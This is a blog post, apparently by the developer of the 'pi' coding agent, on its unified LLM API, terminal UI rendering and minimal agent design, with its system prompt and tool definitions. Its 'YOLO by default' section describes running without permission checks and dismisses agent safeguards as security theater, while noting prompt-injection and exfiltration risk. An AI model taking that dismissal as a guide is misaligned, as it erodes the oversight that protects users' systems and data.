<li><strong><a href="https://github.com/badlogic/pi-mono/tree/main/packages/ai">pi-ai</a></strong>: A unified LLM API with multi-provider support (Anthropic, OpenAI, Google, xAI, Groq, Cerebras, OpenRouter, and any OpenAI-compatible endpoint), streaming, tool calling with TypeBox schemas, thinking/reasoning support, seamless cross-provider context handoffs, and token and cost tracking.</li>
<li><strong><a href="https://github.com/badlogic/pi-mono/tree/main/packages/agent">pi-agent-core</a></strong>: An agent loop that handles tool execution, validation, and event streaming.</li>
<li><strong><a href="https://github.com/badlogic/pi-mono/tree/main/packages/tui">pi-tui</a></strong>: A minimal terminal UI framework with differential rendering, synchronized output for (almost) flicker-free updates, and components like editors with autocomplete and markdown rendering.</li>
<li><strong><a href="https://github.com/badlogic/pi-mono/tree/main/packages/coding-agent">pi-coding-agent</a></strong>: The actual CLI that wires it all together with session management, custom tools, themes, and project context files.</li>
</ul>
<p>My philosophy in all of this was: if I don't need it, it won't be built. And I don't need a lot of things.</p>
<h2 id="toc_0">pi-ai and pi-agent-core</h2>
<p>I'm not going to bore you with the API specifics of this package. You can read it all in the <a href="https://github.com/badlogic/pi-mono/blob/main/packages/ai/README.md">README.md</a>. Instead, I want to document the problems I ran into while creating a unified LLM API and how I resolved them. I'm not claiming my solutions are the best, but they've been working pretty well throughout various agentic and non-agentic LLM projects.</p>
<h3 id="toc_1">There. Are. Four. Ligh... APIs</h3>
<p>There's really only four APIs you need to speak to talk to pretty much any LLM provider: <a href="https://platform.openai.com/docs/api-reference/chat/create">OpenAI's Completions API</a>, their newer <a href="https://platform.openai.com/docs/api-reference/responses">Responses API</a>, <a href="https://docs.anthropic.com/en/api/messages">Anthropic's Messages API</a>, and <a href="https://ai.google.dev/api">Google's Generative AI API</a>.</p>
<p>They're all pretty similar in features, so building an abstraction on top of them isn't rocket science. There are, of course, provider-specific peculiarities you have to care for. That's especially true for the Completions API, which is spoken by pretty much all providers, but each of them has a different understanding of what this API should do. For example, while OpenAI doesn't support reasoning traces in their Completions API, other providers do in their version of the Completions API. This is also true for inference engines like <a href="https://github.com/ggml-org/llama.cpp">llama.cpp</a>, <a href="https://ollama.com/">Ollama</a>, <a href="https://github.com/vllm-project/vllm">vLLM</a>, and <a href="https://lmstudio.ai/">LM Studio</a>.</p>
<p>For example, in <a href="https://github.com/badlogic/pi-mono/blob/main/packages/ai/src/providers/openai-completions.ts">openai-completions.ts</a>:</p>
<ul>
<li>Cerebras, xAI, Mistral, and Chutes don't like the <code>store</code> field</li>
<li>Mistral and Chutes use <code>max_tokens</code> instead of <code>max_completion_tokens</code></li>
<li>Cerebras, xAI, Mistral, and Chutes don't support the <code>developer</code> role for system prompts</li>
<li>Grok models don't like <code>reasoning_effort</code></li>
<li>Different providers return reasoning content in different fields (<code>reasoning_content</code> vs <code>reasoning</code>)</li>
</ul>
<p>To ensure all features actually work across the gazillion of providers, pi-ai has a pretty extensive test suite covering image inputs, reasoning traces, tool calling, and other features you'd expect from an LLM API. Tests run across all supported providers and popular models. While this is a good effort, it still won't guarantee that new models and providers will just work out of the box.</p>
<p>Another big difference is how providers report tokens and cache reads/writes. Anthropic has the sanest approach, but generally it's the Wild West. Some report token counts at the start of the SSE stream, others only at the end, making accurate cost tracking impossible if a request is aborted. To add insult to injury, you can't provide a unique ID to later correlate with their billing APIs and figure out which of your users consumed how many tokens. So pi-ai does token and cache tracking on a best-effort basis. Good enough for personal use, but not for accurate billing if you have end users consuming tokens through your service.</p>
<p>Special shout out to Google who to this date seem to not support tool call streaming which is extremely Google.</p>
<p>pi-ai also works in the browser, which is useful for building web-based interfaces. Some providers make this especially easy by supporting CORS, specifically Anthropic and xAI.</p>
<h3 id="toc_2">Context handoff</h3>
<p>Context handoff between providers was a feature pi-ai was designed for from the start. Since each provider has their own way of tracking tool calls and thinking traces, this can only be a best-effort thing. For example, if you switch from Anthropic to OpenAI mid-session, Anthropic thinking traces are converted to content blocks inside assistant messages, delimited by <code>&lt;thinking&gt;&lt;/thinking&gt;</code> tags. This may or may not be sensible, because the thinking traces returned by Anthropic and OpenAI don't actually represent what's happening behind the scenes.</p>
<p>These providers also insert signed blobs into the event stream that you have to replay on subsequent requests containing the same messages. This also applies when switching models within a provider. It makes for a cumbersome abstraction and transformation pipeline in the background.</p>
<p>I'm happy to report that cross-provider context handoff and context serialization/deserialization work pretty well in pi-ai:</p>
<div>

<pre><code><span>import</span> { getModel, complete, <span>Context</span> } <span>from</span> <span>'@mariozechner/pi-ai'</span>;

<span>// Start with Claude</span>
<span>const</span> claude = <span>getModel</span>(<span>'anthropic'</span>, <span>'claude-sonnet-4-5'</span>);
<span>const</span> <span>context</span>: <span>Context</span> = {
  <span>messages</span>: []
};

context.<span>messages</span>.<span>push</span>({ <span>role</span>: <span>'user'</span>, <span>content</span>: <span>'What is 25 * 18?'</span> });
<span>const</span> claudeResponse = <span>await</span> <span>complete</span>(claude, context, {
  <span>thinkingEnabled</span>: <span>true</span>
});
context.<span>messages</span>.<span>push</span>(claudeResponse);

<span>// Switch to GPT - it will see Claude's thinking as &lt;thinking&gt; tagged text</span>
<span>const</span> gpt = <span>getModel</span>(<span>'openai'</span>, <span>'gpt-5.1-codex'</span>);
context.<span>messages</span>.<span>push</span>({ <span>role</span>: <span>'user'</span>, <span>content</span>: <span>'Is that correct?'</span> });
<span>const</span> gptResponse = <span>await</span> <span>complete</span>(gpt, context);
context.<span>messages</span>.<span>push</span>(gptResponse);

<span>// Switch to Gemini</span>
<span>const</span> gemini = <span>getModel</span>(<span>'google'</span>, <span>'gemini-2.5-flash'</span>);
context.<span>messages</span>.<span>push</span>({ <span>role</span>: <span>'user'</span>, <span>content</span>: <span>'What was the question?'</span> });
<span>const</span> geminiResponse = <span>await</span> <span>complete</span>(gemini, context);

<span>// Serialize context to JSON (for storage, transfer, etc.)</span>
<span>const</span> serialized = <span>JSON</span>.<span>stringify</span>(context);

<span>// Later: deserialize and continue with any model</span>
<span>const</span> <span>restored</span>: <span>Context</span> = <span>JSON</span>.<span>parse</span>(serialized);
restored.<span>messages</span>.<span>push</span>({ <span>role</span>: <span>'user'</span>, <span>content</span>: <span>'Summarize our conversation'</span> });
<span>const</span> continuation = <span>await</span> <span>complete</span>(claude, restored);
</code></pre></div>

<h3 id="toc_3">We live in a multi-model world</h3>
<p>Speaking of models, I wanted a typesafe way of specifying them in the <code>getModel</code> call. For that I needed a model registry that I could turn into TypeScript types. I'm parsing data from both <a href="https://openrouter.ai/">OpenRouter</a> and <a href="https://models.dev/">models.dev</a> (created by the opencode folks, thanks for that, it's super useful) into <a href="https://github.com/badlogic/pi-mono/blob/main/packages/ai/src/models.generated.ts">models.generated.ts</a>. This includes token costs and capabilities like image inputs and thinking support.</p>
<p>And if I ever need to add a model that's not in the registry, I wanted a type system that makes it easy to create new ones. This is especially useful when working with self-hosted models, new releases that aren't yet on models.dev or OpenRouter, or trying out one of the more obscure LLM providers:</p>
<pre><code><span>import</span> { <span>Model</span>, stream } <span>from</span> <span>'@mariozechner/pi-ai'</span>;

<span>const</span> <span>ollamaModel</span>: <span>Model</span>&lt;<span>'openai-completions'</span>&gt; = {
  <span>id</span>: <span>'llama-3.1-8b'</span>,
  <span>name</span>: <span>'Llama 3.1 8B (Ollama)'</span>,
  <span>api</span>: <span>'openai-completions'</span>,
  <span>provider</span>: <span>'ollama'</span>,
  <span>baseUrl</span>: <span>'http://localhost:11434/v1'</span>,
  <span>reasoning</span>: <span>false</span>,
  <span>input</span>: [<span>'text'</span>],
  <span>cost</span>: { <span>input</span>: <span>0</span>, <span>output</span>: <span>0</span>, <span>cacheRead</span>: <span>0</span>, <span>cacheWrite</span>: <span>0</span> },
  <span>contextWindow</span>: <span>128000</span>,
  <span>maxTokens</span>: <span>32000</span>
};

<span>const</span> response = <span>await</span> <span>stream</span>(ollamaModel, context, {
  <span>apiKey</span>: <span>'dummy'</span> <span>// Ollama doesn't need a real key</span>
});
</code></pre><p>Many unified LLM APIs completely ignore providing a way to abort requests. This is entirely unacceptable if you want to integrate your LLM into any kind of production system. Many unified LLM APIs also don't return partial results to you, which is kind of ridiculous. pi-ai was designed from the beginning to support aborts throughout the entire pipeline, including tool calls. Here's how it works:</p>
<pre><code><span>import</span> { getModel, stream } <span>from</span> <span>'@mariozechner/pi-ai'</span>;

<span>const</span> model = <span>getModel</span>(<span>'openai'</span>, <span>'gpt-5.1-codex'</span>);
<span>const</span> controller = <span>new</span> <span>AbortController</span>();

<span>// Abort after 2 seconds</span>
<span>setTimeout</span>(<span>() =&gt;</span> controller.<span>abort</span>(), <span>2000</span>);

<span>const</span> s = <span>stream</span>(model, {
  <span>messages</span>: [{ <span>role</span>: <span>'user'</span>, <span>content</span>: <span>'Write a long story'</span> }]
}, {
  <span>signal</span>: controller.<span>signal</span>
});

<span>for</span> <span>await</span> (<span>const</span> event <span>of</span> s) {
  <span>if</span> (event.<span>type</span> === <span>'text_delta'</span>) {
    process.<span>stdout</span>.<span>write</span>(event.<span>delta</span>);
  } <span>else</span> <span>if</span> (event.<span>type</span> === <span>'error'</span>) {
    <span>console</span>.<span>log</span>(<span>`<span>${event.reason === <span>'aborted'</span> ? <span>'Aborted'</span> : <span>'Error'</span>}</span>:`</span>, event.<span>error</span>.<span>errorMessage</span>);
  }
}

<span>// Get results (may be partial if aborted)</span>
<span>const</span> response = <span>await</span> s.<span>result</span>();
<span>if</span> (response.<span>stopReason</span> === <span>'aborted'</span>) {
  <span>console</span>.<span>log</span>(<span>'Partial content:'</span>, response.<span>content</span>);
}
</code></pre><h3 id="toc_4">Structured split tool results</h3>
<p>Another abstraction I haven't seen in any unified LLM API is splitting tool results into a portion handed to the LLM and a portion for UI display. The LLM portion is generally just text or JSON, which doesn't necessarily contain all the information you'd want to show in a UI. It also sucks hard to parse textual tool outputs and restructure them for display in a UI. pi-ai's tool implementation allows returning both content blocks for the LLM and separate content blocks for UI rendering. Tools can also return attachments like images that get attached in the native format of the respective provider. Tool arguments are automatically validated using <a href="https://github.com/sinclairzx81/typebox">TypeBox</a> schemas and <a href="https://ajv.js.org/">AJV</a>, with detailed error messages when validation fails:</p>
<div>

<pre><code><span>import</span> { <span>Type</span>, <span>AgentTool</span> } <span>from</span> <span>'@mariozechner/pi-ai'</span>;

<span>const</span> weatherSchema = <span>Type</span>.<span>Object</span>({
  <span>city</span>: <span>Type</span>.<span>String</span>({ <span>minLength</span>: <span>1</span> }),
});

<span>const</span> <span>weatherTool</span>: <span>AgentTool</span>&lt;<span>typeof</span> weatherSchema, { <span>temp</span>: <span>number</span> }&gt; = {
  <span>name</span>: <span>'get_weather'</span>,
  <span>description</span>: <span>'Get current weather for a city'</span>,
  <span>parameters</span>: weatherSchema,
  <span>execute</span>: <span>async</span> (toolCallId, args) =&gt; {
    <span>const</span> temp = <span>Math</span>.<span>round</span>(<span>Math</span>.<span>random</span>() * <span>30</span>);
    <span>return</span> {
      <span>// Text for the LLM</span>
      <span>output</span>: <span>`Temperature in <span>${args.city}</span>: <span>${temp}</span>°C`</span>,
      <span>// Structured data for the UI</span>
      <span>details</span>: { temp }
    };
  }
};

<span>// Tools can also return images</span>
<span>const</span> <span>chartTool</span>: <span>AgentTool</span> = {
  <span>name</span>: <span>'generate_chart'</span>,
  <span>description</span>: <span>'Generate a chart from data'</span>,
  <span>parameters</span>: <span>Type</span>.<span>Object</span>({ <span>data</span>: <span>Type</span>.<span>Array</span>(<span>Type</span>.<span>Number</span>()) }),
  <span>execute</span>: <span>async</span> (toolCallId, args) =&gt; {
    <span>const</span> chartImage = <span>await</span> <span>generateChartImage</span>(args.<span>data</span>);
    <span>return</span> {
      <span>content</span>: [
        { <span>type</span>: <span>'text'</span>, <span>text</span>: <span>`Generated chart with <span>${args.data.length}</span> data points`</span> },
        { <span>type</span>: <span>'image'</span>, <span>data</span>: chartImage.<span>toString</span>(<span>'base64'</span>), <span>mimeType</span>: <span>'image/png'</span> }
      ]
    };
  }
};
</code></pre></div>

<p>What's still lacking is tool result streaming. Imagine a bash tool where you want to display ANSI sequences as they come in. That's currently not possible, but it's a simple fix that will eventually make it into the package.</p>
<p>Partial JSON parsing during tool call streaming is essential for good UX. As the LLM streams tool call arguments, pi-ai progressively parses them so you can show partial results in the UI before the call completes. For example, you can display a diff streaming in as the agent rewrites a file.</p>
<h3 id="toc_5">Minimal agent scaffold</h3>
<p>Finally, pi-ai provides an <a href="https://github.com/badlogic/pi-mono/blob/main/packages/ai/src/agent/agent-loop.ts">agent loop</a> that handles the full orchestration: processing user messages, executing tool calls, feeding results back to the LLM, and repeating until the model produces a response without tool calls. The loop also supports message queuing via a callback: after each turn, it asks for queued messages and injects them before the next assistant response. The loop emits events for everything, making it easy to build reactive UIs.</p>
<p>The agent loop doesn't let you specify max steps or similar knobs you'd find in other unified LLM APIs. I never found a use case for that, so why add it? The loop just loops until the agent says it's done. On top of the loop, however, <a href="https://github.com/badlogic/pi-mono/tree/main/packages/agent">pi-agent-core</a> provides an <code>Agent</code> class with actually useful stuff: state management, simplified event subscriptions, message queuing with two modes (one-at-a-time or all-at-once), attachment handling (images, documents), and a transport abstraction that lets you run the agent either directly or through a proxy.</p>
<p>Am I happy with pi-ai? For the most part, yes. Like any unifying API, it can never be perfect due to leaky abstractions. But it's been used in seven different production projects and has served me extremely well.</p>
<p>Why build this instead of using the Vercel AI SDK? <a href="https://lucumr.pocoo.org/2025/11/21/agents-are-hard/">Armin's blog post</a> mirrors my experience. Building on top of the provider SDKs directly gives me full control and lets me design the APIs exactly as I want, with a much smaller surface area. Armin's blog gives you a more in-depth treatise on the reasons for building your own. Go read that.</p>
<h2 id="toc_6">pi-tui</h2>
<p>I grew up in the DOS era, so terminal user interfaces are what I grew up with. From the fancy setup programs for Doom to Borland products, TUIs were with me until the end of the 90s. And boy was I fucking happy when I eventually switched to a GUI operating system. While TUIs are mostly portable and easily streamable, they also suck at information density. Having said all that, I thought starting with a terminal user interface for pi makes the most sense. I could strap on a GUI later whenever I felt like I needed to.</p>
<p>So why build my own TUI framework? I've looked into the alternatives like <a href="https://github.com/vadimdemedes/ink">Ink</a>, <a href="https://github.com/chjj/blessed">Blessed</a>, <a href="https://github.com/sst/opentui">OpenTUI</a>, and so on. I'm sure they're all fine in their own way, but I definitely don't want to write my TUI like a React app. Blessed seems to be mostly unmaintained, and OpenTUI is explicitly not production ready. Also, writing my own TUI framework on top of Node.js seemed like a fun little challenge.</p>
<h3 id="toc_7">Two kinds of TUIs</h3>
<p>Writing a terminal user interface is not rocket science per se. You just have to pick your poison. There's basically two ways to do it. One is to take ownership of the terminal viewport (the portion of the terminal contents you can actually see) and treat it like a pixel buffer. Instead of pixels you have cells that contain characters with background color, foreground color, and styling like italic and bold. I call these full screen TUIs. Amp and opencode use this approach.</p>
<p>The drawback is that you lose the scrollback buffer, which means you have to implement custom search. You also lose scrolling, which means you have to simulate scrolling within the viewport yourself. While this is not hard to implement, it means you have to re-implement all the functionality your terminal emulator already provides. Mouse scrolling specifically always feels kind of off in such TUIs.</p>
<p>The second approach is to just write to the terminal like any CLI program, appending content to the scrollback buffer, only occasionally moving the "rendering cursor" back up a little within the visible viewport to redraw things like animated spinners or a text edit field. It's not exactly that simple, but you get the idea. This is what Claude Code, Codex, and Droid do.</p>
<p>Coding agents have this nice property that they're basically a chat interface. The user writes a prompt, followed by replies from the agent and tool calls and their results. Everything is nicely linear, which lends itself well to working with the "native" terminal emulator. You get to use all the built-in functionality like natural scrolling and search within the scrollback buffer. It also limits what your TUI can do to some degree, which I find charming because constraints make for minimal programs that just do what they're supposed to do without superfluous fluff. This is the direction I picked for pi-tui.</p>
<h3 id="toc_8">Retained mode UI</h3>
<p>If you've done any GUI programming, you've probably heard of retained mode vs immediate mode. In a retained mode UI, you build up a tree of components that persist across frames. Each component knows how to render itself and can cache its output if nothing changed. In an immediate mode UI, you redraw everything from scratch each frame (though in practice, immediate mode UIs also do caching, otherwise they'd fall apart).</p>
<p>pi-tui uses a simple retained mode approach. A <code>Component</code> is just an object with a <code>render(width)</code> method that returns an array of strings (lines that fit the viewport horizontally, with ANSI escape codes for colors and styling) and an optional <code>handleInput(data)</code> method for keyboard input. A <code>Container</code> holds a list of components arranged vertically and collects all their rendered lines. The <code>TUI</code> class is itself a container that orchestrates everything.</p>
<p>When the TUI needs to update the screen, it asks each component to render. Components can cache their output: an assistant message that's fully streamed doesn't need to re-parse markdown and re-render ANSI sequences every time. It just returns the cached lines. Containers collect lines from all children. The TUI gathers all these lines and compares them to the lines it previously rendered for the previous component tree. It keeps a backbuffer of sorts, remembering what was written to the scrollback buffer.</p>
<p>Then it only redraws what changed, using a method I call differential rendering. I'm very bad with names, and this likely has an official name.</p>
<h3 id="toc_9">Differential rendering</h3>
<p>Here's a simplified demo that illustrates what exactly gets redrawn.</p>






<p>The algorithm is simple:</p>
<ol>
<li><strong>First render</strong>: Just output all lines to the terminal</li>
<li><strong>Width changed</strong>: Clear screen completely and re-render everything (soft wrapping changes)</li>
<li><strong>Normal update</strong>: Find the first line that differs from what's on screen, move the cursor to that line, and re-render from there to the end</li>
</ol>
<p>There's one catch: if the first changed line is above the visible viewport (the user scrolled up), we have to do a full clear and re-render. The terminal doesn't let you write to the scrollback buffer above the viewport.</p>
<p>To prevent flicker during updates, pi-tui wraps all rendering in synchronized output escape sequences (<code>CSI ?2026h</code> and <code>CSI ?2026l</code>). This tells the terminal to buffer all the output and display it atomically. Most modern terminals support this.</p>
<p>How well does it work and how much does it flicker? In any capable terminal like Ghostty or iTerm2, this works brilliantly and you never see any flicker. In less fortunate terminal implementations like VS Code's built-in terminal, you will get some flicker depending on the time of day, your display size, your window size, and so on. Given that I'm very accustomed to Claude Code, I haven't spent any more time optimizing this. I'm happy with the little flicker I get in VS Code. I wouldn't feel at home otherwise. And it still flickers less than Claude Code.</p>
<p>How wasteful is this approach? We store an entire scrollback buffer worth of previously rendered lines, and we re-render lines every time the TUI is asked to render itself. That's alleviated with the caching I described above, so the re-rendering isn't a big deal. We still have to compare a lot of lines with each other. Realistically, on computers younger than 25 years, this is not a big deal, both in terms of performance and memory use (a few hundred kilobytes for very large sessions). Thanks V8. What I get in return is a dead simple programming model that lets me iterate quickly.</p>
<h2 id="toc_10">pi-coding-agent</h2>
<p>I don't need to explain what features you should expect from a coding agent harness. pi comes with most creature comforts you're used to from other tools:</p>
<ul>
<li><p>Runs on Windows, Linux, and macOS (or anything with a Node.js runtime and a terminal)</p>
</li>
<li><p>Multi-provider support with mid-session model switching</p>
</li>
<li><p>Session management with continue, resume, and branching</p>
</li>
<li><p>Project context files (AGENTS.md) loaded hierarchically from global to project-specific</p>
</li>
<li><p>Slash commands for common operations</p>
</li>
<li><p>Custom slash commands as markdown templates with argument support</p>
</li>
<li><p>OAuth authentication for Claude Pro/Max subscriptions</p>
</li>
<li><p>Custom model and provider configuration via JSON</p>
</li>
<li><p>Customizable themes with live reload</p>
</li>
<li><p>Editor with fuzzy file search, path completion, drag &amp; drop, and multi-line paste</p>
</li>
<li><p>Message queuing while the agent is working</p>
</li>
<li><p>Image support for vision-capable models</p>
</li>
<li><p>HTML export of sessions</p>
</li>
<li><p>Headless operation via JSON streaming and RPC mode</p>
</li>
<li><p>Full cost and token tracking</p>
</li>
</ul>
<p>If you want the full rundown, read the <a href="https://github.com/badlogic/pi-mono/blob/main/packages/coding-agent/README.md">README</a>. What's more interesting is where pi deviates from other harnesses in philosophy and implementation.</p>
<h3 id="toc_11">Minimal system prompt</h3>
<p>Here's the system prompt:</p>

<div>

<pre><code>You are an expert coding assistant. You help users with coding tasks by reading files, executing commands, editing code, and writing new files.

Available tools:
<span>-</span> read: Read file contents
<span>-</span> bash: Execute bash commands
<span>-</span> edit: Make surgical edits to files
<span>-</span> write: Create or overwrite files

Guidelines:
<span>-</span> Use bash for file operations like ls, grep, find
<span>-</span> Use read to examine files before editing
<span>-</span> Use edit for precise changes (old text must match exactly)
<span>-</span> Use write only for new files or complete rewrites
<span>-</span> When summarizing your actions, output plain text directly - do NOT use cat or bash to display what you did
<span>-</span> Be concise in your responses
<span>-</span> Show file paths clearly when working with files

Documentation:
<span>-</span> Your own documentation (including custom model setup and theme creation) is at: /path/to/README.md
<span>-</span> Read it when users ask about features, configuration, or setup, and especially if the user asks you to add a custom model or provider, or create a custom theme.
</code></pre></div>

<p>That's it. The only thing that gets injected at the bottom is your AGENTS.md file. Both the global one that applies to all your sessions and the project-specific one stored in your project directory. This is where you can customize pi to your liking. You can even replace the full system prompt if you want to. Compared to, for example, <a href="https://cchistory.mariozechner.at/">Claude Code's system prompt</a>, <a href="https://github.com/openai/codex/blob/main/codex-rs/core/prompt.md">Codex's system prompt</a>, or <a href="https://github.com/sst/opencode/tree/dev/packages/opencode/src/session/prompt">opencode's model-specific prompts</a> (the Claude one is a <a href="https://github.com/sst/opencode/blob/dev/packages/opencode/src/session/prompt/anthropic.txt">cut-down version</a> of the <a href="https://github.com/sst/opencode/blob/dev/packages/opencode/src/session/prompt/anthropic-20250930.txt">original Claude Code prompt</a> they copied).</p>
<p>You might think this is crazy. In all likelihood, the models have some training on their native coding harness. So using the native system prompt or something close to it like opencode would be most ideal. But it turns out that all the frontier models have been RL-trained up the wazoo, so they inherently understand what a coding agent is. There does not appear to be a need for 10,000 tokens of system prompt, as we'll find out later in the benchmark section, and as I've anecdotally found out by exclusively using pi for the past few weeks. Amp, while copying some parts of the native system prompts, seems to also do just fine with their own prompt.</p>
<h3 id="toc_12">Minimal toolset</h3>
<p>Here are the tool definitions:</p>
<pre><code>read
  Read the contents of a file. Supports text files and images (jpg, png,
  gif, webp). Images are sent as attachments. For text files, defaults to
  first 2000 lines. Use offset/limit for large files.
  - path: Path to the file to read (relative or absolute)
  - offset: Line number to start reading from (1-indexed)
  - limit: Maximum number of lines to read

write
  Write content to a file. Creates the file if it doesn't exist, overwrites
  if it does. Automatically creates parent directories.
  - path: Path to the file to write (relative or absolute)
  - content: Content to write to the file

edit
  Edit a file by replacing exact text. The oldText must match exactly
  (including whitespace). Use this for precise, surgical edits.
  - path: Path to the file to edit (relative or absolute)
  - oldText: Exact text to find and replace (must match exactly)
  - newText: New text to replace the old text with

bash
  Execute a bash command in the current working directory. Returns stdout
  and stderr. Optionally provide a timeout in seconds.
  - command: Bash command to execute
  - timeout: Timeout in seconds (optional, no default timeout)
</code></pre><p>There are additional read-only tools (grep, find, ls) if you want to restrict the agent from modifying files or running arbitrary commands. By default these are disabled, so the agent only gets the four tools above.</p>
<p>As it turns out, these four tools are all you need for an effective coding agent. Models know how to use bash and have been trained on the read, write, and edit tools with similar input schemas. Compare this to <a href="https://cchistory.mariozechner.at/">Claude Code's tool definitions</a> or <a href="https://github.com/sst/opencode/tree/dev/packages/opencode/src/tool">opencode's tool definitions</a> (which are clearly derived from Claude Code's, same structure, same examples, same git commit flow). Notably, <a href="https://github.com/openai/codex/blob/main/codex-rs/core/src/tools/spec.rs">Codex's tool definitions</a> are similarly minimal to pi's.</p>
<p>pi's system prompt and tool definitions together come in below 1000 tokens.</p>
<h3 id="toc_13">YOLO by default</h3>
<p>pi runs in full YOLO mode and assumes you know what you're doing. It has unrestricted access to your filesystem and can execute any command without permission checks or safety rails. No permission prompts for file operations or commands. No <a href="https://mariozechner.at/posts/2025-08-03-cchistory/#haiku-this-haiku-that">pre-checking of bash commands by Haiku</a> for malicious content. Full filesystem access. Can execute any command with your user privileges.</p>
<p>If you look at the security measures in other coding agents, they're mostly security theater. As soon as your agent can write code and run code, it's pretty much game over. The only way you could prevent exfiltration of data would be to cut off all network access for the execution environment the agent runs in, which makes the agent mostly useless. An alternative is allow-listing domains, but this can also be worked around through other means.</p>
<p>Simon Willison has <a href="https://simonwillison.net/2023/Apr/25/dual-llm-pattern/">written extensively</a> about this problem. His "dual LLM" pattern attempts to address confused deputy attacks and data exfiltration, but even he admits "this solution is pretty bad" and introduces enormous implementation complexity. The core issue remains: if an LLM has access to tools that can read private data and make network requests, you're playing whack-a-mole with attack vectors.</p>
<p>Since we cannot solve this trifecta of capabilities (read data, execute code, network access), pi just gives in. Everybody is running in YOLO mode anyways to get any productive work done, so why not make it the default and only option?</p>
<p>By default, pi has no web search or fetch tool. However, it can use <code>curl</code> or read files from disk, both of which provide ample surface area for prompt injection attacks. Malicious content in files or command outputs can influence behavior. If you're uncomfortable with full access, run pi inside a container or use a different tool if you need (faux) guardrails.</p>
<h3 id="toc_14">No built-in to-dos</h3>
<p>pi does not and will not support built-in to-dos. In my experience, to-do lists generally confuse models more than they help. They add state that the model has to track and update, which introduces more opportunities for things to go wrong.</p>
<p>If you need task tracking, make it externally stateful by writing to a file:</p>
<pre><code><span># TODO.md</span>

<span>-</span> [x] Implement user authentication
<span>-</span> [x] Add database migrations
<span>-</span> [ ] Write API documentation
<span>-</span> [ ] Add rate limiting
</code></pre><p>The agent can read and update this file as needed. Using checkboxes keeps track of what's done and what remains. Simple, visible, and under your control.</p>
<h3 id="toc_15">No plan mode</h3>
<p>pi does not and will not have a built-in plan mode. Telling the agent to think through a problem together with you, without modifying files or executing commands, is generally sufficient.</p>
<p>If you need persistent planning across sessions, write it to a file:</p>
<pre><code><span># PLAN.md</span>

<span>## Goal</span>
Refactor authentication system to support OAuth

<span>## Approach</span>
<span>1.</span> Research OAuth 2.0 flows
<span>2.</span> Design token storage schema
<span>3.</span> Implement authorization server endpoints
<span>4.</span> Update client-side login flow
<span>5.</span> Add tests

<span>## Current Step</span>
Working on step 3 - authorization endpoints
</code></pre><p>The agent can read, update, and reference the plan as it works. Unlike ephemeral planning modes that only exist within a session, file-based plans can be shared across sessions, and can be versioned with your code.</p>
<p>Funnily enough, Claude Code now has a <a href="https://code.claude.com/docs/en/common-workflows#use-plan-mode-for-safe-code-analysis">Plan Mode</a> that's essentially read-only analysis, and it will eventually write a markdown file to disk. And you can basically not use plan mode without approving a shit ton of command invocations, because without that, planning is basically impossible.</p>
<p>The difference with pi is that I have full observability of everything. I get to see which sources the agent actually looked at and which ones it totally missed. In Claude Code, the orchestrating Claude instance usually spawns a sub-agent and you have zero visibility into what that sub-agent does. I get to see the markdown file immediately. I can edit it collaboratively with the agent. In short, I need observability for planning and I don't get that with Claude Code's plan mode.</p>
<p>If you must restrict the agent during planning, you can specify which tools it has access to via the CLI:</p>
<pre><code>pi --tools <span>read</span>,grep,find,<span>ls</span>
</code></pre><p>This gives you read-only mode for exploration and planning without the agent modifying anything or being able to run bash commands. You won't be happy with that though.</p>
<h3 id="toc_16">No MCP support</h3>
<p>pi does not and will not support MCP. I've <a href="https://mariozechner.at/posts/2025-11-02-what-if-you-dont-need-mcp/">written about this extensively</a>, but the TL;DR is: MCP servers are overkill for most use cases, and they come with significant context overhead.</p>
<p>Popular MCP servers like Playwright MCP (21 tools, 13.7k tokens) or Chrome DevTools MCP (26 tools, 18k tokens) dump their entire tool descriptions into your context on every session. That's 7-9% of your context window gone before you even start working. Many of these tools you'll never use in a given session.</p>
<p>The alternative is simple: build CLI tools with README files. The agent reads the README when it needs the tool, pays the token cost only when necessary (progressive disclosure), and can use bash to invoke the tool. This approach is composable (pipe outputs, chain commands), easy to extend (just add another script), and token-efficient.</p>
<p>Here's how I add web search to pi:</p>
<video src="https://mariozechner.at/posts/2025-11-30-pi-coding-agent/media/websearch.mp4" controls="" loading="lazy">
</video>

<p>I maintain a collection of these tools at <a href="https://github.com/badlogic/agent-tools">github.com/badlogic/agent-tools</a>. Each tool is a simple CLI with a README that the agent reads on demand.</p>
<p>If you absolutely must use MCP servers, look into <a href="https://x.com/steipete">Peter Steinberger's</a> <a href="https://github.com/steipete/mcporter">mcporter</a> tool that wraps MCP servers as CLI tools.</p>
<h3 id="toc_17">No background bash</h3>
<p>pi's bash tool runs commands synchronously. There's no built-in way to start a dev server, run tests in the background, or interact with a REPL while the command is still running.</p>
<p>This is intentional. Background process management adds complexity: you need process tracking, output buffering, cleanup on exit, and ways to send input to running processes. Claude Code handles some of this with their background bash feature, but it has poor observability (a common theme with Claude Code) and forces the agent to track running instances without providing a tool to query them. In earlier Claude Code versions, the agent forgot about all its background processes after context compaction and had no way to query them, so you had to manually kill them. This has since been fixed.</p>
<p>Use <a href="https://github.com/tmux/tmux">tmux</a> instead. Here's pi debugging a crashing C program in LLDB:</p>
<video src="https://mariozechner.at/posts/2025-11-30-pi-coding-agent/media/tmux.mp4" controls="" loading="lazy">
</video>

<p>How's that for observability? The same approach works for long-running dev servers, watching log output, and similar use cases. And if you wanted to, you could hop into that LLDB session above via tmux and co-debug with the agent. Tmux also gives you a CLI argument to list all active sessions. How nice.</p>
<p>There's simply no need for background bash. Claude Code can use tmux too, you know. Bash is all you need.</p>
<h3 id="toc_18">No sub-agents</h3>
<p>pi does not have a dedicated sub-agent tool. When Claude Code needs to do something complex, it often spawns a sub-agent to handle part of the task. You have zero visibility into what that sub-agent does. It's a black box within a black box. Context transfer between agents is also poor. The orchestrating agent decides what initial context to pass to the sub-agent, and you generally have little control over that. If the sub-agent makes a mistake, debugging is painful because you can't see the full conversation.</p>
<p>If you need pi to spawn itself, just ask it to run itself via bash. You could even have it spawn itself inside a tmux session for full observability and the ability to interact with that sub-agent directly.</p>
<img src="https://mariozechner.at/posts/2025-11-30-pi-coding-agent/media/subagent.jpeg" loading="lazy">

<p>But more importantly: fix your workflow, at least the ones that are all about context gathering. People use sub-agents within a session thinking they're saving context space, which is true. But that's the wrong way to think about sub-agents. Using a sub-agent mid-session for context gathering is a sign you didn't plan ahead. If you need to gather context, do that first in its own session. Create an artifact that you can later use in a fresh session to give your agent all the context it needs without polluting its context window with tool outputs. That artifact can be useful for the next feature too, and you get full observability and steerability, which is important during context gathering.</p>
